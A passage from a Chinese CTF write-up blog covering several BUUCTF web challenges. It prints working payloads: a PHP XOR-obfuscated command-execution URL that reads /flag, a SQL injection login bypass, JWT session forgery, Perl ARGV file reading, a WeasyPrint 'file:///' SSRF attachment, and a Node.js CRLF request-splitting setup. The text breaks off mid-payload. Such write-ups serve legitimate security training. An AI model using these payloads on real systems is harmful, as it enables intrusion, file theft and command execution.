<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;       &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在运行结果中找到_GET即可，构造payload</p>
<blockquote>
<p>is_nan^64==&gt;_G</p>
<p>tan^15==&gt;ET</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>


<h2 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="[RootersCTF2019]babyWeb"></a>[RootersCTF2019]babyWeb</h2><p>知识点：万能密码</p>
<p>SQL查询，过滤了：<code>union</code>、<code>sleep</code>、<code>&#39;</code>、<code>&quot;</code>、<code>or</code>、<code>-</code>、<code>benchmark</code></p>
<p><code>order by</code>测试字段数，发现当<code>order by 2</code>时返回正常<code>order by 3</code>返回没有这个字段，确定为两个字段，一个为<code>uniqueid</code>另一个应该就是flag</p>
<p>那么应该就是输入id判断登录，即可，尝试万能密码登录：<code>1 || 1=1 limit 0,1;</code>即可得到flag</p>
<h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>知识点：</p>
<ol>
<li>jwt</li>
<li>session伪造</li>
<li>curl</li>
</ol>
<p>随便注册个用户（admin无法注册），登入，来到文件上传页面，上传文件抓包，发现session-id ,尝试jwt解密，参数有我们注册的账号，猜测为session伪造，不过我们需要知道密钥，dirsearch扫目录，得到robots.txt，一路访问，得到密钥，伪造admin，修改session刷新后，即到admin界面，发现flag.php ,访问如下，即可得到flag</p>
<blockquote>
<p>view-source:<a target="_blank" rel="noopener" href="http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png">http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png</a></p>
</blockquote>
<p>也可以在命令行</p>
<blockquote>
<p>curl <a target="_blank" rel="noopener" href="http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png">http://f856cd93-d803-43c1-86e7-32e0a2b5ee1a.node3.buuoj.cn/static/128e8ea7ce4a37b7100fb40b28c01280/flag.png</a></p>
</blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html" target="_blank">curl用法指南</a></p>
<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><p>知识点：</p>
<ol>
<li><p>perlparam()任意文件读取</p>
</li>
<li><p>ARGV</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56.jpg"></p>
<p><strong>perl中<code>ARGV</code>是遍历数组变量<code>@ARVG</code>中的所有文件名的特殊文件句柄，<code>@ARVG</code>传给脚本的命令行参数列表</strong></p>
<p><strong>Perl 会将 perl 命令行参数列表放入到数组<code>@ARGV</code>中，而默认情况下，这些命令行参数是Perl的数据输入源，也就是Perl会以依次将他们当作文件进行读取</strong></p>
<p>进入场景后有3个链接，点进去都是.pl文件，.pl文件都是用perl编写的网页文件</p>
<p>利用点在第三个链接，尝试后发现，Files链接可以上传文件并把文件内容打印出来。对此，大佬猜测后台代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">strict</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">warnings</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">CGI</span>;</span><br><span class="line">my <span class="variable">$cgi</span>= CGI-&gt;new;</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$cgi</span>-&gt;upload( ‘file‘ ) ) &#123; </span><br><span class="line">    my <span class="variable">$file</span>= <span class="variable">$cgi</span>-&gt;param( ‘file‘ );</span><br><span class="line">     <span class="keyword">while</span> ( &lt;<span class="variable">$file</span>&gt; ) &#123; <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$_</span>&quot;</span>; &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p><strong>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的。</strong></p>
<p><strong>如果在原来的数据包中新增一个文件上传项，并且删除其<code>filename</code>参数， 后端会将第一个上传项的内容作为<code>$file</code>参数的值，因此我们可以控制$file变量的值</strong></p>
<p><strong>如果<code>$file</code>变量的值是<code>ARGV</code>文件句柄,而<code>ARGV</code>文件句柄会将<code>@ARGV</code>数组的每一项作为文件名并读取它们的内容，也就是说在URL后添加的路径会被放入到<code>@ARGV</code>数组中，配合之前引入的<code>ARGV</code>文件句柄，我们就可以读取任意文件</strong></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu57.jpg"></p>
<h2 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h2><p>知识点：脚本编写</p>
<p><del>做这题之前先去学了下21点的玩法23333</del></p>
<p>访问<code>/api</code>可以得到一个 SecretState 这个是当前余额的一个哈希码</p>
<p>访问<code>/api/deal</code>可以进行赌博，但是只要我们的 state 不会变，我们的余额就不会变，当我们的应答包含 BlackJack 的时候，我们的余额会增加，然后我们就可以获取它的 SerectState 进行下一次赌博，这样就可以一直赢了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">start = <span class="string">&quot;http://b42cb231-7e9b-45db-a960-99f5fc875ca6.node3.buuoj.cn/api&quot;</span></span><br><span class="line">deal = start + <span class="string">&quot;/deal&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开局</span></span><br><span class="line">state = requests.post(start).json()[<span class="string">&quot;SecretState&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 下注</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(deal, json=&#123;<span class="string">&quot;Bet&quot;</span>: <span class="number">500</span>, <span class="string">&quot;SecretState&quot;</span>: state&#125;).json()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> resp[<span class="string">&#x27;GameState&#x27;</span>] == <span class="string">&#x27;Blackjack&#x27;</span>:</span><br><span class="line">        state = resp[<span class="string">&#x27;SecretState&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    print(resp[<span class="string">&#x27;Balance&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> resp[<span class="string">&#x27;Balance&#x27;</span>] &gt; <span class="number">100000</span>:</span><br><span class="line">        print(resp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>flag在state最后</p>
<h2 id="FireshellCTF2020-URL-TO-PDF"><a href="#FireshellCTF2020-URL-TO-PDF" class="headerlink" title="[FireshellCTF2020]URL TO PDF"></a>[FireshellCTF2020]URL TO PDF</h2><p>知识点：</p>
<ol>
<li>ssrf</li>
<li>Burp Collaborator</li>
</ol>
<p>打开题目，是个 URL 转 PDF 的在线转换器,输入一个 URL，就会转成 PDF。但是不能直接用 <code>file://</code> 协议去读本地文件，会报错。使用bp的Burp Collaborator模块看下请求</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu58.jpg"></p>
<p>发现使用了 WeasyPrint</p>
<p><strong>在 Hacker One – Ben Sadeghipour 的这个关于 SSRF 的 DEF CON 议题上，有一部分专门介绍了 Weasy Print。</strong></p>
<blockquote>
<p><strong>Attachments are related files, embedded in the PDF itself. They can be specified through <link rel="attachment"> elements to add resources globally or through regular links with <a rel="attachment"> to attach a resource that can be saved by clicking on said link. The title attribute can be used as description of the attachment.</a></strong></p>
</blockquote>
<p><strong>意思就是说我们可以使用锚和链接标签将文件作为附件嵌入到生成的PDF中，并且可以轻松地从PDF中提取附件</strong></p>
<p>它可以解析 <code>&lt;link attachment=xxx&gt;</code>，因此我们可以在 vps 上构造 payload： <code>&lt;link rel=”attachment” href=”file:///flag”&gt;</code>，下载下来的 pdf 虽说没有显示，但是放到<code>binwalk -e 文件名</code>后打开解压的文件 中看能看到 flag，提取出即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;attachment&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>知识点：</p>
<ol>
<li>CRLF</li>
<li>SSRF</li>
</ol>
<p>代码分析</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">&quot;index&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>( action.includes(<span class="string">&quot;/&quot;</span>) || action.includes(<span class="string">&quot;\\&quot;</span>) )&#123;</span><br><span class="line">res.send(<span class="string">&quot;Errrrr, You have been Blocked&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">file = path.join(__dirname + <span class="string">&#x27;/template/&#x27;</span>+ action +<span class="string">&#x27;.pug&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>/<br>接受action参数。如果没有就默认为index<br>file=dirname+/template/+action+.png<br>然后用pug引擎进行渲染。可以理解为执行这个文件</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/file_upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">msg: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">obj.msg=<span class="string">&quot;only admin&#x27;s ip can use it&quot;</span></span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(err)&#123;</span><br><span class="line">obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">var</span> file_path = <span class="string">&#x27;/uploads/&#x27;</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">&quot;/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line"><span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line"><span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">fs.mkdirSync(__dirname + file_path)</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">fs.writeFileSync(dir_file,data)</span><br><span class="line">obj = &#123;</span><br><span class="line">msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">filename: file_path + file_name</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>/file_upload<br>上传文件时先判断是否是 127.0.0.1 也就是本地请求<br>那么得找一个SSRF的点<br>然后就是获取上传的文件，根据其传过去的 MIME 类型保存到指定目录<br>filepath=/uploads/+mimetype+/<br>而mimetype可控。那么我们可以跨目录,构造任意路径文件写入</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> q = req.query.q;</span><br><span class="line"><span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (q) &#123;</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line"><span class="built_in">console</span>.log(url)</span><br><span class="line"><span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line"><span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">resps = chunk.toString();</span><br><span class="line">res.send(resps);</span><br><span class="line">&#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">res.send(e.message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">res.send(e.message);&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line"><span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line"><span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line"><span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> host = server.address().address</span><br><span class="line"><span class="keyword">var</span> port = server.address().port</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>/core<br>接受一个q参数。然后对其进行黑名单检测<br>然后对q输入的值进行请求,明显就是SSRF点了</p>
</blockquote>
<p>总的来说就是利用../template进行跨目录。经过处理后就变成了uploads/../template/flag.pug<br>然后刚好就可以通过action参数请求执行,pub文件的内容是包含多个上级目录的flag.txt</p>
<p>不过我们还需要绕过黑名单，可以通过url编码进行绕过，也可以通过nodejs8特性进行绕过</p>
<p><a href="https://xz.aliyun.com/t/2894" target="_blank">通过拆分实现SSRF攻击</a></p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu59.jpg"></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">原始请求数据如下：</span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line">Host: xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line">当我们插入数据后:</span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/upload_file HTTP/</span><span class="number">1.1</span></span><br><span class="line">xxxxxx文件上传</span><br><span class="line">xxxxxx文件上传</span><br><span class="line"></span><br><span class="line">Host:xxxxxxxxxx</span><br><span class="line"></span><br><span class="line">上次请求包的Host参数就单独出来了。会报错。所以我们再构造一个请求把他闭合</span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/upload_file HTTP/</span><span class="number">1.1</span></span><br><span class="line">xxxxxx文件上传</span><br><span class="line">xxxxxx文件上传</span><br><span class="line"></span><br><span class="line">GET <span class="regexp">/flag HTTP/</span><span class="number">1.1</span></span><br><span class="line">x:Host:xxxxxxxxxx</span><br></pre></td></tr></table></figure>
<p><a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank">pug</a></p>
<p><strong><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu60.jpg"></strong></p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//改编自 Nullcon HackIM <span class="number">2020</span> - split second</span><br><span class="line">//https://blog.p6.<span class="keyword">is</span>/nullcon-hackim-<span class="number">2020</span>-split-second/</span><br><span class="line">//这里用的是url编码绕过黑名单</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST 